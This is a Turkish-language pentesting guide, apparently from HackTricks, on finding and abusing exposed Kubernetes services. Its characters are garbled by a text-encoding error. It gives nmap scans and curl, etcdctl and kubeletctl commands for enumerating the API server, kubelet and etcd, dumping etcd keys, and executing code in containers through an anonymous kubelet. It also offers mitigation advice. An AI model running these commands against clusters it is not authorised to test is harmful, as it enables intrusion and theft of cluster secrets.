# Pentesting Kubernetes Services

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

Kubernetes, **bir podu ele geÃ§irdiÄŸinizde** **Ä°nternete aÃ§Ä±k** veya **iÃ§ aÄŸda** bulabileceÄŸiniz birkaÃ§ **Ã¶zel aÄŸ hizmeti** kullanÄ±r.

## AÃ§Ä±k podlarÄ± OSINT ile bulma

Bir yol, kubernetes ile ilgili alt alanlarÄ± bulmak iÃ§in [crt.sh](https://crt.sh) Ã¼zerinde `Identity LIKE "k8s.%.com"` aramasÄ± yapmaktÄ±r. DiÄŸer bir yol ise github'da `"k8s.%.com"` aramasÄ± yaparak **YAML dosyalarÄ±nÄ±** iÃ§eren stringleri aramaktÄ±r.

## Kubernetes'in Hizmetleri NasÄ±l AÃ§tÄ±ÄŸÄ±

Kubernetes'in hizmetleri **kamusal olarak nasÄ±l aÃ§abileceÄŸini** anlamak sizin iÃ§in faydalÄ± olabilir:

{% content-ref url="../exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](../exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## Port taramasÄ± ile AÃ§Ä±k podlarÄ± Bulma

AÅŸaÄŸÄ±daki portlar bir Kubernetes kÃ¼mesinde aÃ§Ä±k olabilir:

| Port            | SÃ¼reÃ§         | AÃ§Ä±klama                                                              |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | Kubernetes API port                                                    |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | Konteyner metrikleri                                                  |
| 6443/TCP        | kube-apiserver | Kubernetes API port                                                    |
| 8443/TCP        | kube-apiserver | Minikube API port                                                      |
| 8080/TCP        | kube-apiserver | GÃ¼vensiz API port                                                      |
| 10250/TCP       | kubelet        | Tam mod eriÅŸimine izin veren HTTPS API                                 |
| 10255/TCP       | kubelet        | Kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ salt okunur HTTP portu: podlar, Ã§alÄ±ÅŸan podlar ve dÃ¼ÄŸÃ¼m durumu |
| 10256/TCP       | kube-proxy     | Kube Proxy saÄŸlÄ±k kontrol sunucusu                                     |
| 9099/TCP        | calico-felix   | Calico iÃ§in saÄŸlÄ±k kontrol sunucusu                                   |
| 6782-4/TCP      | weave          | Metrikler ve uÃ§ noktalar                                              |
| 30000-32767/TCP | NodePort       | Hizmetlere proxy                                                      |
| 44134/TCP       | Tiller         | Helm hizmeti dinliyor                                                 |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

Bu, yÃ¶neticilerin genellikle **`kubectl`** aracÄ±nÄ± kullanarak iletiÅŸim kurduÄŸu **API Kubernetes servisi**dir.

**YaygÄ±n portlar: 6443 ve 443**, ayrÄ±ca minikube'da 8443 ve gÃ¼vensiz olarak 8080.
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**Hassas verileri elde etme ve bu hizmetle konuÅŸarak hassas eylemler gerÃ§ekleÅŸtirme hakkÄ±nda bilgi almak iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± kontrol edin:**

{% content-ref url="../kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](../kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

Bu hizmet **kÃ¼menin her dÃ¼ÄŸÃ¼mÃ¼nde Ã§alÄ±ÅŸÄ±r**. **DÃ¼ÄŸÃ¼m** iÃ§indeki pod'larÄ± **kontrol eden** hizmettir. **kube-apiserver** ile iletiÅŸim kurar.

Bu hizmetin aÃ§Ä±k olduÄŸunu bulursanÄ±z, **kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ RCE** bulmuÅŸ olabilirsiniz.

#### Kubelet API
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
EÄŸer yanÄ±t `Unauthorized` ise, kimlik doÄŸrulama gerektirir.

EÄŸer dÃ¼ÄŸÃ¼mleri listeleyebiliyorsanÄ±z, kubelet uÃ§ noktalarÄ±nÄ±n bir listesini ÅŸu ÅŸekilde alabilirsiniz:
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubelet (Sadece okunur)
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### etcd API
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### Tiller
```
helm --host tiller-deploy.kube-system:44134 version
```
Bu hizmeti Kubernetes iÃ§inde yetki yÃ¼kseltmek iÃ§in kÃ¶tÃ¼ye kullanabilirsiniz:

### cAdvisor

Metrikleri toplamak iÃ§in yararlÄ± bir hizmet.
```
curl -k https://<IP Address>:4194
```
### NodePort

Bir port **NodePort** aracÄ±lÄ±ÄŸÄ±yla tÃ¼m dÃ¼ÄŸÃ¼mlerde aÃ§Ä±ldÄ±ÄŸÄ±nda, aynÄ± port tÃ¼m dÃ¼ÄŸÃ¼mlerde aÃ§Ä±lÄ±r ve trafiÄŸi belirtilen **Service**'e yÃ¶nlendirir. VarsayÄ±lan olarak bu port **30000-32767** aralÄ±ÄŸÄ±nda olacaktÄ±r. Bu nedenle, yeni kontrol edilmemiÅŸ hizmetler bu portlar Ã¼zerinden eriÅŸilebilir olabilir.
```
sudo nmap -sS -p 30000-32767 <IP>
```
## GÃ¼venlik AÃ§Ä±ÄŸÄ± Olan YanlÄ±ÅŸ YapÄ±landÄ±rmalar

### Kube-apiserver Anonim EriÅŸimi

**kube-apiserver API uÃ§ noktalarÄ±na anonim eriÅŸim izin verilmez**. Ancak bazÄ± uÃ§ noktalarÄ± kontrol edebilirsiniz:

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **ETCD Anonim EriÅŸimini Kontrol Etme**

ETCD, kÃ¼me gizli anahtarlarÄ±nÄ±, yapÄ±landÄ±rma dosyalarÄ±nÄ± ve daha fazla **hassas veriyi** saklar. **VarsayÄ±lan olarak**, ETCD **anonim olarak** eriÅŸilemez, ancak kontrol etmek her zaman iyidir.

EÄŸer ETCD anonim olarak eriÅŸilebiliyorsa, **ÅŸu aracÄ± kullanmanÄ±z** gerekebilir: [**etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md). AÅŸaÄŸÄ±daki komut, saklanan tÃ¼m anahtarlarÄ± alacaktÄ±r:
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **Kubelet RCE**

The [**Kubelet belgeleri**](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) **varsayÄ±lan olarak anonim eriÅŸime** hizmete **izin verildiÄŸini** aÃ§Ä±klar:

> Kubelet sunucusuna anonim istekleri etkinleÅŸtirir. BaÅŸka bir kimlik doÄŸrulama yÃ¶ntemi tarafÄ±ndan reddedilmeyen istekler anonim istekler olarak kabul edilir. Anonim isteklerin kullanÄ±cÄ± adÄ± `system:anonymous` ve grup adÄ± `system:unauthenticated`'dÄ±r.

**Kubelet API'sinin kimlik doÄŸrulama ve yetkilendirme** iÅŸleminin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± daha iyi anlamak iÃ§in bu sayfayÄ± kontrol edin:

{% content-ref url="kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

**Kubelet** hizmetinin **API'si belgelenmemiÅŸtir**, ancak kaynak kodu burada bulunabilir ve maruz kalan uÃ§ noktalarÄ± bulmak **Ã§alÄ±ÅŸtÄ±rmak** kadar kolaydÄ±r:
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
Hepsi ilginÃ§ gÃ¶rÃ¼nÃ¼yor.

Kubeletler ve onlarÄ±n uÃ§ noktalarÄ± ile etkileÅŸimde bulunmak iÃ§in [**Kubeletctl**](https://github.com/cyberark/kubeletctl) aracÄ±nÄ± kullanabilirsiniz.

#### /pods

Bu uÃ§ nokta pod'larÄ± ve onlarÄ±n konteynerlerini listeler:
```bash
kubeletctl pods
```
#### /exec

Bu uÃ§ nokta, herhangi bir konteyner iÃ§inde kodu Ã§ok kolay bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rmaya olanak tanÄ±r:
```bash
kubeletctl exec [command]
```
{% hint style="info" %}
Bu saldÄ±rÄ±yÄ± Ã¶nlemek iÃ§in _**kubelet**_ servisi `--anonymous-auth false` ile Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ± ve servis aÄŸ dÃ¼zeyinde ayrÄ±lmalÄ±dÄ±r.
{% endhint %}

### **Kubelet (Sadece Okuma Portu) Bilgi AÃ§Ä±ÄŸÄ±nÄ±n KontrolÃ¼**

Bir **kubelet sadece okuma portu** aÃ§Ä±ldÄ±ÄŸÄ±nda, yetkisiz taraflar tarafÄ±ndan API'den bilgi alÄ±nmasÄ± mÃ¼mkÃ¼n hale gelir. Bu portun aÃ§Ä±lmasÄ±, Ã§eÅŸitli **kÃ¼me yapÄ±landÄ±rma unsurlarÄ±nÄ±n** ifÅŸasÄ±na yol aÃ§abilir. **Pod adlarÄ±, iÃ§ dosyalarÄ±n konumlarÄ± ve diÄŸer yapÄ±landÄ±rmalar** gibi bilgiler kritik olmasa da, aÃ§Ä±ÄŸa Ã§Ä±kmasÄ± yine de bir gÃ¼venlik riski oluÅŸturur ve kaÃ§Ä±nÄ±lmalÄ±dÄ±r.

Bu zafiyetin nasÄ±l istismar edilebileceÄŸine dair bir Ã¶rnek, uzaktan bir saldÄ±rganÄ±n belirli bir URL'ye eriÅŸim saÄŸlamasÄ±dÄ±r. `http://<external-IP>:10255/pods` adresine giderek, saldÄ±rgan kubelet'ten hassas bilgileri potansiyel olarak alabilir:

![https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## Referanslar

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
